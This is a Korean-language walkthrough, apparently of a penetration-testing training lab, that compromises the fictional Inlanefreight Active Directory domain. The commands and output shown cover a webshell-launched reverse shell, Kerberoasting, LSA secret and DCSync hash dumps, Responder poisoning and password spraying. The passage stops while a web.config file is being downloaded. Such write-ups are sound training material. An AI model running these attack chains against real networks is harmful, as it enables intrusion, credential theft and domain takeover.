---
title: "Active Directory - Skills Assessment"
date: 2026-08-21
layout: single
excerpt: "고객사 Inlanefreight의 의뢰를 받아 외부에 노출된 웹 서버와 내부 Active Directory 환경을 대상으로 침투 테스트를 수행하고 있다. 기존 팀원이 확보한 웹 셸 foothold와 내부 Parrot Linux 호스트를 시작점으로 네트워크와 도메인 환경을 폭넓게 열거하고, Kerberoasting, 자격 증명 탈취, ACL 및 권한 관계 분석, MSSQL 권한 상승, NTLM 인증 악용 등 다양한 공격 경로를 추적한다. 발견된 취약점과 잘못된 설정을 실제 공격 체인으로 연결하여 횡적 이동과 권한 상승이 어디까지 가능한지 확인하고, 최종적으로 도메인 전체가 장악될 수 있는지 검증해야 한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-web/active-directory-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-infra]
tags: [cpts, active-directory, kerberoasting, bloodhound, dcsync]
---

# Skills Assessment Part I

## Scenario

한 팀원이 외부 침투 테스트​를 시작했지만, 테스트를 끝내기 전에 다른 긴급 프로젝트로 이동하게 되었다.

그 팀원은 외부에 노출된 웹 서버를 정찰하던 중 파일 업로드 취약점을 발견했고, 이를 성공적으로 악용했다.

다른 프로젝트로 이동하기 전에 팀원은 우리가 이어서 작업할 수 있도록 `/uploads` 디렉터리에 비밀번호로 보호된 웹셸​을 남겨두었다.

웹셸 인증 정보는 다음과 같다:

```text
admin:My_W3bsH3ll_P@ssw0rd!
```

이번 평가에서 고객사인 Inlanefreight는 현재 확보한 foothold를 이용해 내부 환경에서 어디까지 침투할 수 있는지 확인하는 것을 허가했다.

또한 고객사는 Active Directory 환경 내에 어떤 고위험 취약점이나 보안 문제가 존재하는지 확인하는 데 관심이 있다.

따라서 다음을 수행해야 한다:

웹셸을 활용하여 내부 네트워크에 초기 foothold를 확보하고, Active Directory 환경을 열거하면서 취약점과 잘못된 설정​을 찾아라.

이러한 문제들을 이용해 횡적 이동​을 수행하고, 최종적으로 도메인 전체를 장악​해야 한다.

### Web Server Reconnaissance

우선 제공받은 IP로 접속해 외부에 노출된 웹 서버를 확인하였다:

![Active Directory](/assets/cpts-infra/active-directory-skills-assessment/ad1.png)

웹 페이지에는 파일 업로드 기능만 단순하게 노출되어 있었다.

이전 팀원이 웹셸을 업로드해 둔 상태였으므로 `/uploads` 경로로 이동해 전달받은 자격 증명으로 인증하였다:

![Active Directory](/assets/cpts-infra/active-directory-skills-assessment/ad2.png)

접속 결과 Antak PowerShell Webshell이 배치되어 있음을 확인할 수 있었다.

따라서 웹셸의 명령 실행 기능을 이용해 PowerShell Reverse Shell을 실행할 수 있는 상태였다.

우선 로컬 터미널에서 Netcat 리스너를 실행하였다:

```bash
$ nc -lvnp 9001
```

이후 [revshell](https://www.revshells.com/)에서 PowerShell Reverse Shell 명령을 생성해 웹셸에서 실행했고, 정상적으로 리스너에 연결되었다:

```powershell
connect to [10.10.14.49] from (UNKNOWN) [10.129.202.242] 49696

PS C:\windows\system32\inetsrv>
```

### Host and Network Reconnaissance

`whoami` 를 확인한 결과 현재 웹셸 프로세스가 `NT AUTHORITY\SYSTEM` 권한으로 실행되고 있었다:

```powershell
PS C:\windows\system32\inetsrv> whoami

nt authority\system
```

또한 `ipconfig /all` 을 확인해 보니 `172.16.6.100` 내부 인터페이스와 `172.16.6.3` DNS 서버가 확인되었다:

```powershell
PS C:\windows\system32\inetsrv> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WEB-WIN01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL
                                       .htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : A2-DE-AD-26-D8-50
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::a42b:63b4:2c8b:844f%7(Preferred) 
   IPv4 Address. . . . . . . . . . . : 172.16.6.100(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-35-97-AC-A2-DE-AD-E7-24-56
   DNS Servers . . . . . . . . . . . : 172.16.6.3
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

SPN이 등록된 계정들을 열거해 보니 다음과 같은 서비스 계정들이 확인되었다:

```powershell
PS C:\windows\system32\inetsrv> setspn -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
# SKIP
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        kadmin/changepw
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL02.inlanefreight.local:1433
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEVTEST.inlanefreight.local:1433
CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/QA001.inlanefreight.local:1433
CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local
CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
# SKIP
```

이후 Rubeus를 이용해 SPN이 등록된 계정에 대한 TGS를 요청하고, 오프라인 크래킹에 사용할 수 있는 Kerberoasting 형식으로 추출하였다:

```powershell
PS C:\windows\system32\inetsrv> .\Rubeus.exe kerberoast /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 7

[*] SamAccountName         : azureconnect
[*] DistinguishedName      : CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : adfsconnect/azure01.inlanefreight.local
[*] PwdLastSet             : 3/30/2022 2:15:13 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*azureconnect$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local@INLANEFREIGHT.LOCAL*$8DCD7F91845CA91B535C875DFAFE4881$C254D7BD60304DC2907E7473FF63705794CE814F363D7BB21ADCF67E1AA89257F91801EECA3060D2EBF27372F85F5C3C265CC0B477E27E1F87C8EAF8F62ED49E1732D4C650AFC940E824785948BA2E06173835C89B244843A6A864757FE6645FC562C2C29BE86D60A54E0A95FC96669F7A224A4D7F886DE2D2EF94B82AD633CA117DE5E470330B3BEE4DF8F4FCAA9BA5A8A50E9CE260BA5C00D9389A909279A05F61770E1510294C3DDA44835D19741CDC5B10B5FF241CF011A2448FDA76CCF1604C309AD0BDE1909DA0126E9BBD5A0CB6924E486D428DF72A7C59E09AB8E978F58CCF34DC072D13FB416BEBF4E0A1CD752DF79B79019D01573B6524305A88DCA93BF3611DC152544F244BFFEE37CC75D12BD4837A67B3C6065A7C41736F2B7883881D1855F10F31F2534D9F28A8FC2946155F13499EE8DE2CA9B81FC460
# SKIP
```

이 중 오프라인 크래킹에 성공한 계정은 `svc_sql` 이었다:

```bash
$ hashcat --show -m 13100 '$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$8CFF57747035CC6F3D686A56881370D4$21976B7095722E8AAFA19C050C3AEEEACCAFE00FFB92112D5290CF43210D7E01BFDDAC4E5572F2ADDFB353A3DF8BF6894957443B0173AE8DC9AB1E13664C66689733BB1DC18AD82C268A8055A276A2982EA703DA84002F5806D39FE6331F211B611DCCFD75272187B7EA50CC6763F1E34DCE0B32361F7A40FB9CA6601046BB74B31405FA9887C72044408E68EB503C56806C6DAD9F581743766BB3380FF89C43246462B3A89156E4274962113BDF2F533A098BF21A8BE263DAFC558FAB961EE29C29ECDBFE0948D7E32C050CA039FEAB4E4296B4094119F66B84850B3BC38724A3BB6764884E0138CA3E0623B04FBE73D1BB467B462782A086BB18762B1297FAEA91B3321C34EE631BEC5504ECA4DE9F3EDB8114A5B9B3A972FAF0A88F125748152E8D4BCD997BCDB03F5EA5B21C8EFCC36DAA600147144C7C125D094A22B49DFA486A263FC313CA501AF92432E3D209DB2DD07AABF32B909E99177CE6BEA6D0067A750D6DF6460FC67CAC4BB903C07F2CA016D73E32AF74E5C70308EB1C5A21CE43EF4EE58B7AE3779B138F1BE0CE0F2607F5EFE44005422A15AA63FF9800906F2B1E3B5CE37EE39C41FC788212A11F60219305807385A62D2E74F49A697CCF165163EF68713BE6C3C007384B89697FB2C99BD832A636BBB144E1704402F7ACAAB3A97D78B3ADC5386034E3714C147B9CE8DA55921B1E71D88FCB5F821BBA1C0F2E651621F84122DC61A8E47B15786EB7E04DA111404A469D7B48AA1DB0CDF0F15542415D1B7D6EAA00ADF7B820C1EA3CBCE1555D01B870514D468FDE6D7A359734F042473959CB50312EB13F92FDC75078DD57DEB674EB5D1E21EB98A0BD60AF1EA5D642F95C34CE8B683280FA435787507F00285DDE7EC4942F42571A141B7811AF252C5DEB7CC604CA7E2D8F22BF0F321E876794CB0DD1ACDC507D294FC92A549E2BEED39524335CEF6A06744D0CA6227162192B3603DF2CB218394B945B554A83568B58A427512A63D4912B9DC69F2117B238AD32C3A1C1ED808BDA764BEA75BB53B6132F21D83498C6B90D57A27CDFCE586ACC7535C13A7876424EB3ADB391F315B5399202840E16CDC3367100C4A4C5C736A9BCB706C264ABE5ADFF316AC2BF8595830183A34C0A547DB7C884FF69F550DACA2F79902503149EDEC09D4C0C3B46914BF234A2C9D8412C1039FC88C459855F072D30DA5A88FB5006B92DC10FE9EB67CB19457B3B587E30D2B843C912B409C71D6F2BE38F13787850349F7652DFD34FDEEA19F2355C0B1EC98E49588AF90F994751787E2AD2D1366D51BF88508A1390D81991570C79F37061663946232B092EE340885318C1616B0166DDAE98177966EEAA606FC7643C8998BF4D76D4C66834964312335A9E710A60738674110CD659CBFA2BA05D1C4C3679DBED5F6175BE495B6918081514EA00D0037256D13B72B821D7DB51FC91B52499F7FCFE6B02C236FAC156148614FE5DF172D5829EEE84BDE7A9A07625E0679D013022F61232808CE5A1D1' /usr/share/wordlists/rockyou.txt

<SKIP>:lucky7
```

따라서 `svc_sql` 계정의 비밀번호가 `lucky7` 임을 확인할 수 있었다.

### Enumeration with Compromised Credentials

포트 포워딩을 구성한 뒤 획득한 `svc_sql:lucky7` 자격 증명을 이용해 내부 SMB 호스트들을 확인하였다:

```bash
$ proxychains -q nxc smb 172.16.6.0/24 -u svc_sql -p lucky7

SMB         172.16.6.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:None)
SMB         172.16.6.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.6.100    445    WEB-WIN01        [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB-WIN01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:None)

SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.3      445    DC01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 
SMB         172.16.6.100    445    WEB-WIN01        [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 
```

확인된 주요 호스트는 다음과 같다:

```text
172.16.6.50     MS01             
172.16.6.3      DC01            
172.16.6.100    WEB-WIN01        
```

NXC의 SMB 결과에서 MS01에 `Pwn3d!` 가 표시되었다. 

SMB 모듈에서 이 표시는 해당 계정이 대상 호스트에서 관리자 수준의 권한을 가진 것으로 판단되었음을 의미한다.

따라서 WinRM 접근이 가능한지 Evil-WinRM으로 확인하였다:

```bash
$ proxychains -q evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7
                                                                                                             
*Evil-WinRM* PS C:\Users\svc_sql.INLANEFREIGHT\Documents> whoami

inlanefreight\svc_sql

*Evil-WinRM* PS C:\Users\svc_sql.INLANEFREIGHT\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
# SKIP
```

`whoami /priv` 결과를 통해 `svc_sql` 세션에 여러 고권한 Windows Privilege가 활성화되어 있음을 확인할 수 있었다.

### BloodHound Enumeration

다음 단계로 Active Directory 객체 간 권한 관계를 확인하기 위해 BloodHound 데이터를 수집하였다.

먼저 Kerberos 및 LDAP 이름 해석을 위해 `/etc/hosts` 에 DC의 FQDN을 추가하였다:

```bash
$ sudo sh -c 'echo "172.16.6.3 DC01.INLANEFREIGHT.LOCAL DC01" >> /etc/hosts'
```

이후 NXC의 BloodHound 수집 기능으로 도메인 데이터를 수집하였다:

```bash
$ proxychains -q nxc ldap 172.16.6.3 -u svc_sql -p 'lucky7' -d INLANEFREIGHT.LOCAL --bloodhound --dns-server 172.16.6.3 --dns-tcp -c all

LDAP        172.16.6.3      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        172.16.6.3      389    DC01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 
LDAP        172.16.6.3      389    DC01             Resolved collection methods: localadmin, container, objectprops, rdp, psremote, dcom, trusts, group, session, acl                                                                 
LDAP        172.16.6.3      389    DC01             Done in 3M 47S
LDAP        172.16.6.3      389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_172.16.6.3_2026-09-11_081920_bloodhound.zip
```

BloodHound에서 `tpetty` 사용자가 도메인 객체에 대해 디렉터리 복제 관련 권한을 가지고 있는 것을 확인할 수 있었다:

![Active Directory](/assets/cpts-infra/active-directory-skills-assessment/ad3.png)

화면에서는 `GetChanges`, `GetChangesAll` 과 복제 관련 추가 권한이 `tpetty` 에서 도메인 객체로 연결되어 있다.

따라서 `tpetty` 의 자격 증명을 확보할 수 있다면 DCSync로 이어지는 명확한 공격 경로가 존재한다.

### Recovering TPetty Autologon Credentials

MS01의 Winlogon 설정을 확인한 결과 `AutoAdminLogon` 이 활성화되어 있고 기본 사용자로 `tpetty` 가 지정되어 있었다:

```powershell
*Evil-WinRM* PS C:\Users\svc_sql.INLANEFREIGHT\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

# SKIP

    LastLogOffEndTimePerfCounter    REG_QWORD    0x4b43fe6e
    ShutdownFlags    REG_DWORD    0x13
    AutoAdminLogon    REG_DWORD    0x1
    DefaultDomainName    REG_SZ    INLANEFREIGHT
    DefaultUserName    REG_SZ    tpetty
    LastUsedUsername    REG_SZ    tpetty
```

`AutoAdminLogon = 1` 과 `DefaultUserName = tpetty` 는 이 시스템에 자동 로그온이 구성되어 있음을 보여준다.

현재 `svc_sql` 은 MS01에서 관리자 권한을 가지고 있으므로, 자동 로그온에 사용되는 비밀값이 LSA Secret에 저장되어 있는지 확인할 수 있다.

자동 로그온 비밀번호의 저장 위치는 구성 방식에 따라 다르다. 

일반 Winlogon 자동 로그온은 `DefaultPassword` 레지스트리 값을 사용할 수 있고, Sysinternals Autologon을 사용한 경우에는 비밀번호가 LSA Secret에 저장된다.

LSA Secrets에는 환경에 따라 다음과 같은 민감한 값이 저장될 수 있다:

```text
자동 로그인 비밀번호: Sysinternals Autologon.exe를 사용한 경우 DefaultPassword를 Winlogon 레지스트리에 평문으로 두는 대신 LSA Secret에 보관한다.
Windows 서비스 계정 비밀번호: 어떤 서비스가 DOMAIN\svc_xxx 같은 계정으로 실행되고 비밀번호를 저장하도록 설정돼 있으면 관련 secret이 존재할 수 있다.
컴퓨터 계정 비밀값: 도메인 가입된 컴퓨터가 DC와 인증할 때 사용하는 머신 계정 관련 secret.
DPAPI_SYSTEM 관련 키: SYSTEM/LocalService/NetworkService 컨텍스트의 DPAPI 보호에 사용되는 시스템 비밀값이다.
도메인 캐시 자격증명과 관련된 키 정보: 캐시된 도메인 로그온 데이터를 보호하는 데 쓰이는 NL$KM 같은 값이다.
일부 예약 작업, 서비스, 시스템 컴포넌트가 저장한 비밀값도 환경에 따라 존재할 수 있다.
```

여기서 LSA는 Windows의 보안 정책과 인증을 담당하는 구성 요소이고, LSASS는 이를 호스팅하는 프로세스이다:

```text
                LSASS.exe
                    │
        ┌───────────┼───────────┐
        │           │           │
       LSA         SAM      Auth Packages
        │           │       (Kerberos/NTLM)
        │           │
  LSA Secrets    로컬 계정 DB
```

도메인 컨트롤러에서는 도메인 계정 데이터베이스로 `NTDS.dit` 을 사용한다.

LSA Secrets의 영구 저장소는 주로 `SECURITY` 레지스트리 하이브이며, 이를 복호화하는 데 `SYSTEM` 하이브의 Boot Key 관련 정보가 사용된다. 

즉, LSA Secrets는 SAM에 저장되는 데이터와는 구분된다.

NXC의 `--lsa` 옵션을 사용해 MS01의 LSA Secrets를 확인하였다:

```bash
$ proxychains -q nxc smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

SMB         172.16.6.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:None)
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [*] Dumping LSA secrets
# SKIP 
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:6e3bb0d7ac195b65f98ad380be3d88e0:::                                                                                          
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
```

그 결과 자동 로그온에 사용되던 `tpetty` 의 평문 자격 증명을 획득할 수 있었다.

### DCSync

획득한 `tpetty` 자격 증명과 앞서 확인한 복제 권한을 이용해 `secretsdump` 로 DCSync를 수행했고, 도메인 계정의 NTLM 해시를 복제해 가져올 수 있었다:

```bash
$ proxychains -q impacket-secretsdump -just-dc 'INLANEFREIGHT.LOCAL/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3'

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6dbd63f4a0e7c8b221d61f265c4a08a7:::
inlanefreight.local\avazquez:1714:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:

# SKIP
```

---

# Skills Assessment Part II

## Scenario

고객사인 Inlanefreight가 이번에는 우리에게 전체 범위의 내부 침투 테스트(full-scope internal penetration test)를 다시 의뢰했다.

고객사는 현재 인수합병(M&A) 절차를 앞두고 있어서, 가능한 한 많은 보안 취약점을 찾아 미리 수정하고자 한다.

새로 부임한 CISO(최고정보보호책임자)는 특히 이전 침투 테스트에서는 놓쳤을 가능성이 있는, 좀 더 세밀하고 복잡한 Active Directory 보안 문제를 걱정하고 있다.

고객사는 이번 테스트에서 은밀성이나 탐지 회피(stealth/evasion)는 중요하게 생각하지 않는다. 

대신 네트워크와 Active Directory 환경을 최대한 폭넓게 점검할 수 있도록 내부 네트워크 안에 Parrot Linux VM도 제공해 주었다.

### Initial Host and Network Enumeration

제공된 Parrot Linux VM에 SSH로 접속한 뒤 먼저 네트워크 인터페이스를 확인하였다:

```bash
$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.159.171  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::eaa9:e013:b080:ce9a  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::5918:6476:d255:47ba  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:3f:8d:91  txqueuelen 1000  (Ethernet)
        RX packets 481  bytes 40341 (39.3 KiB)
        RX errors 0  dropped 3  overruns 0  frame 0
        TX packets 131  bytes 16542 (16.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.7.240  netmask 255.255.254.0  broadcast 172.16.7.255
        inet6 fe80::2957:2d31:5225:229a  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:04:4b:22  txqueuelen 1000  (Ethernet)
        RX packets 103  bytes 6885 (6.7 KiB)
        RX errors 0  dropped 4  overruns 0  frame 0
        TX packets 18  bytes 1332 (1.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`ens224` 인터페이스가 `172.16.7.240/23` 으로 설정되어 있었다. 

`/23` 의 실제 연결 네트워크는 `172.16.6.0/23` 이며, 범위는 `172.16.6.0` 부터 `172.16.7.255` 까지이다.

우선 `172.16.7.0/24` 구간을 대상으로 살아 있는 호스트를 확인하였다:

```bash
$ for i in {1..254}; do ping -c 1 -W 1 172.16.7.$i >/dev/null 2>&1 && echo "[+] 172.16.7.$i UP"; done                                                               
[+] 172.16.7.3 UP
[+] 172.16.7.50 UP
[+] 172.16.7.60 UP
[+] 172.16.7.240 UP
```

우선 확인한 `172.16.7.0/24` 범위에서는 네 개의 IP가 응답하였다.

이후 SMB 열거를 통해 각 Windows 호스트의 이름을 확인하였다:

```bash
$ crackmapexec smb 172.16.7.0/24 -u '' -p ''

SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
```

`172.16.7.240` 자체는 SMB 결과에 나타나지 않았고, Nmap으로 확인한 결과 SSH뿐 아니라 `3389/tcp` 의 xrdp 서비스도 열려 있었다:

```bash
$ nmap -sC -sV 172.16.7.240

Nmap scan report for 172.16.7.240
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
```

### Capturing NetNTLMv2 with Responder

내부 인터페이스에서 Responder를 실행하였다. 

Responder는 LLMNR/NBT-NS/mDNS 등의 이름 해석 요청에 Poisoning 응답을 보내 인증을 유도하고, 들어오는 NetNTLMv2 Challenge-Response를 수집할 수 있다:

```bash
$ sudo responder -I ens224                                                                        

[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] Skipping previously captured hash for INLANEFREIGHT\AB920
```

출력에서 `INLANEFREIGHT\AB920` 계정의 인증 응답이 이미 캡처된 적이 있음을 확인할 수 있었다.

획득한 NetNTLMv2 Challenge-Response를 Hashcat 모드 `5600` 으로 오프라인 크래킹한 결과 비밀번호를 확인할 수 있었다:

```bash
─$ hashcat -m 5600 --show 'AB920::INLANEFREIGHT:09d6547a2a24f63c:D108D405076B8A0F31985C72D56B8653:010100000000000080FBC189F441DD011A51DC4D6C8DB9A80000000002000800310047003500540001001E00570049004E002D004B005200560036003200560059005000410031004C0004003400570049004E002D004B005200560036003200560059005000410031004C002E0031004700350054002E004C004F00430041004C000300140031004700350054002E004C004F00430041004C000500140031004700350054002E004C004F00430041004C000700080080FBC189F441DD010600040002000000080030003000000000000000000000000020000066916EBFA426211585342FC3CF192E19EF4D2C8F909C57F6E5A33D4F556E31B60A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000' /usr/share/wordlists/rockyou.txt

<SKIP>:weasal
```

다만 `AB920` 자격 증명으로 추가 열거를 진행했을 때 즉시 이어지는 고권한 공격 경로는 발견하지 못했다.

따라서 도메인 사용자 목록을 확보한 뒤 비밀번호 정책과 Account Lockout Policy를 고려해 Password Spraying을 진행하였다.

### Password Spraying

먼저 유효한 자격 증명으로 도메인 사용자를 열거하고, Password Spraying에 사용할 사용자명만 추출하였다.

SMB 사용자 열거 결과에서 계정명만 추출해 `users.txt` 로 저장하였다:

```bash
$ crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users | awk '{print $5}' | cut -d'\' -f2 | tee users.txt

# SKIP
```

이후 자주 사용될 수 있는 비밀번호를 소수만 시도하였다.

그 결과 `BR086` 계정이 `Welcome1` 비밀번호를 사용하고 있음을 확인하였다:

```bash
$ crackmapexec smb 172.16.7.3 -u users.txt -p Welcome1 | grep +

SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1
```

### Discovering Credentials in web.config

이후 로컬 환경에서 내부 SMB를 안정적으로 열거하기 위해 포트 포워딩을 구성하고 다시 공유 디렉터리를 확인하였다:

```bash
$ proxychains -q nxc smb 172.16.7.3 -u BR086 -p Welcome1 --shares

SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                          
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\AB920:weasal 
SMB         172.16.7.3      445    DC01             [*] Enumerated shares
SMB         172.16.7.3      445    DC01             Share           Permissions     Remark
SMB         172.16.7.3      445    DC01             -----           -----------     ------
SMB         172.16.7.3      445    DC01             ADMIN$                          Remote Admin
SMB         172.16.7.3      445    DC01             C$                              Default share
SMB         172.16.7.3      445    DC01             Department Shares READ            Share for department users
SMB         172.16.7.3      445    DC01             IPC$            READ            Remote IPC
SMB         172.16.7.3      445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.7.3      445    DC01             SYSVOL          READ            Logon server share 
```

읽기 권한이 있는 공유 중 `Department Shares` 가 확인되었다.

해당 공유에서 `passw` 문자열이 포함된 파일을 대상으로 콘텐츠 검색을 수행하였다:

```bash
$ proxychains -q nxc smb 172.16.7.3 -u BR086 -p Welcome1 --spider "Department Shares" --content --pattern "passw" 

SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                          
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
SMB         172.16.7.3      445    DC01             [*] Spidering .
SMB         172.16.7.3      445    DC01             //172.16.7.3/Department Shares/IT/Private/Development/web.config [lastm:'2022-04-01 11:05' size:1203 offset:1203 pattern:'passw']
```

검색 결과 `IT\Private\Development\web.config` 파일이 발견되었다.

해당 `web.config` 파일을 로컬로 다운로드하였다:

```bash
$ proxychains -q nxc smb 172.16.7.3 -u BR086 -p Welcome1 --share "Department Shares" --get-file 'IT\Private\Development\web.config' web.config

